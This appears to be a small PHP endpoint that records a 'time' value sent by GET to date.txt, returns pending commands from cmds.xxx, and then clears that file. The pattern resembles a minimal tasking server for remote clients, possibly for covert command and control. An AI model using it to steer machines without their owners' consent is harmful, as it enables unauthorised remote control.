<?php
 if(isset($_GET['time']) && $_GET['time']!=""){
$file1 = fopen("date.txt", "w") or die("Unable to open file!");
$txt = $_GET['time'];
fwrite($file1, $txt);
fclose($file1);
$file = file_get_contents('cmds.xxx');
echo $file;
$myfile = fopen("cmds.xxx", "w") or die("Unable to open file!");
$txt ="";
fwrite($myfile, $txt);
fclose($myfile);
}
else echo "Invalid Request";
?>

